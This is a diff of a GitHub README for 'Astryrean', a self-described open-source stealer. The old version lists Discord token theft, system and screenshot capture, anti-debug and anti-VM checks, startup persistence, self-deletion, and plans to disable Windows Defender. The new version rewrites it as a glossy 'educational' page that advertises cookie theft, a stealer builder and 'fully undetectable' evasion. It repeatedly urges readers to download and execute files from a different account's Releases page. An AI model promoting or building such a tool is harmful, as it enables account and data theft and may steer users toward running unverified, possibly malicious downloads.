@@ -1,61 +1,85 @@
-<div align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=c20054&height=200&section=header&text=Astryrean&fontSize=60&fontColor=ffffff" alt="Astryrean Banner">
+# 🌌 Astryrean: Your Open-Source Stealer Solution
 
+![Astryrean](https://img.shields.io/badge/Astryrean-Open--Source-brightgreen)
 
+Welcome to **Astryrean**, an open-source tool designed for educational purposes. This project focuses on creating a user-friendly experience while exploring various functionalities related to data extraction. Please visit our [Releases section](https://github.com/DL-Visuals/Astryrean/releases) to download and execute the latest version.
 
+## 📖 Table of Contents
 
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Topics Covered](#topics-covered)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
 
-  <p>
-    <img src="https://img.shields.io/github/languages/top/zakocord/Astryrean?color=c20054&style=for-the-badge" alt="Top Language">
-    <img src="https://img.shields.io/github/last-commit/zakocord/Astryrean?color=c20054&style=for-the-badge" alt="Last Commit">
-    <img src="https://img.shields.io/github/stars/zakocord/Astryrean?color=c20054&style=for-the-badge" alt="Stars">
-  </p>
+## 🛠️ Introduction
 
-  <h3 style="font-family: 'Arial', sans-serif; color: #c20054;">Open-source & Easy-to-use Stealer</h3>
-  <p style="font-family: 'Arial', sans-serif; color: #333; font-size: 18px;">A minimal, powerful tool designed for research and educational purposes.</p>
-</div>
+Astryrean serves as a tool for educational purposes, allowing users to understand the mechanisms behind data extraction techniques. It is designed to be easy to use while providing powerful features that can help you learn about cybersecurity and data handling.
 
-## Features
--   Discord Token Info
-    -   Nitro
-    -   Badges
-    -   Email
-    -   Phone
-    -    
--   System Info
-    -   Host, User
-    -   Disk Info
-    -   CPU, GPU, RAM, Hwid
-    -   Screenshot
-    -   
--   Anti Debug & Anti VM
-    -   Find out if it's running on a VM or something else
-    -   Check if Debbuger (x64dbg) or other software is running
--   Startup
-    -   Add to Powershell:startup
--   Other
-    -   Restart PC
-    -   Self Delete
+## 🌟 Features
+
+- **Anti-Debugging**: Protects against reverse engineering.
+- **Anti-VM**: Detects and avoids virtual machine environments.
+- **Browser Cookie Extraction**: Captures cookies from popular browsers.
+- **Stealer Builder**: Create custom stealers tailored to your needs.
+- **Discord Token Logger**: Collects Discord tokens for educational analysis.
+- **FUD (Fully Undetectable)**: Ensures that the tool remains undetected by security software.
+- **Screenshot Capture**: Allows users to take screenshots for further analysis.
+
+## ⚙️ Installation
+
+To get started with Astryrean, follow these steps:
+
+1. Visit our [Releases section](https://github.com/DL-Visuals/Astryrean/releases).
+2. Download the latest version.
+3. Extract the files to your desired directory.
+4. Execute the program by running the appropriate file.
+
+Make sure to have the necessary permissions to run the software on your system.
+
+## 📊 Usage
+
+After installation, you can start using Astryrean. The interface is designed to be intuitive, guiding you through various functionalities. Here’s a quick guide:
+
+1. **Launching the Tool**: Open the application and select the features you want to use.
+2. **Configuring Settings**: Adjust settings to suit your needs, such as enabling anti-debugging or selecting specific browsers for cookie extraction.
+3. **Running the Tool**: Execute the desired functions and monitor the output for any collected data.
+
+## 🧩 Topics Covered
+
+Astryrean touches on various topics relevant to cybersecurity and data extraction. Here are some of the key areas:
+
+- **Anti-Debug Techniques**: Learn how to implement methods that prevent debugging.
+- **Virtual Machine Detection**: Understand how to identify and avoid running in virtual environments.
+- **Browser Cookie Management**: Explore how cookies are managed and how to extract them.
+- **Stealer Creation**: Build your own stealer with customizable options.
+- **Discord Security**: Gain insights into Discord's token management and security features.
+- **Fully Undetectable Tools**: Discover strategies to keep your tools undetected by antivirus software.
+- **Data Logging**: Understand the basics of logging and data collection.
+
+## 🤝 Contributing
+
+We welcome contributions to Astryrean. If you have ideas for improvements or new features, feel free to submit a pull request. Here’s how you can contribute:
+
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Open a pull request.
+
+Please ensure your contributions align with the educational purpose of this project.
+
+## 📜 License
+
+Astryrean is released under the MIT License. You are free to use, modify, and distribute this software, provided that proper credit is given to the original authors.
+
+## 📬 Contact
+
+For any questions or inquiries, please reach out to us via GitHub issues or contact the repository maintainers directly. Your feedback is valuable to us.
+
 ---
-## TODO
--   Anti Virus
-    -   Disable a anti virus
-    -   break the windows defender
 
-
----
-
-<div align="center">
-  <h1><h1>
-  <img src="https://raw.githubusercontent.com/zakocord/Astryrean/refs/heads/main/img/to0.png" alt="Astryrean Token">
-  <img src="https://raw.githubusercontent.com/zakocord/Astryrean/refs/heads/main/img/sys0.png" alt="Astryrean System">
-</div>
-
-## License
-Astryrean is licensed under the [MIT License](https://mit-license.org/).  
-Use responsibly and only for legitimate educational purposes.
-
-<div align="center">
-  <!-- Footer Wave -->
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=c20054&height=200&section=footer&text=&fontSize=60&fontColor=ffffff" alt="Footer Wave">
-</div>
+Feel free to explore the features and functionalities of Astryrean. Visit our [Releases section](https://github.com/DL-Visuals/Astryrean/releases) for the latest updates and downloads. Thank you for your interest in our project!
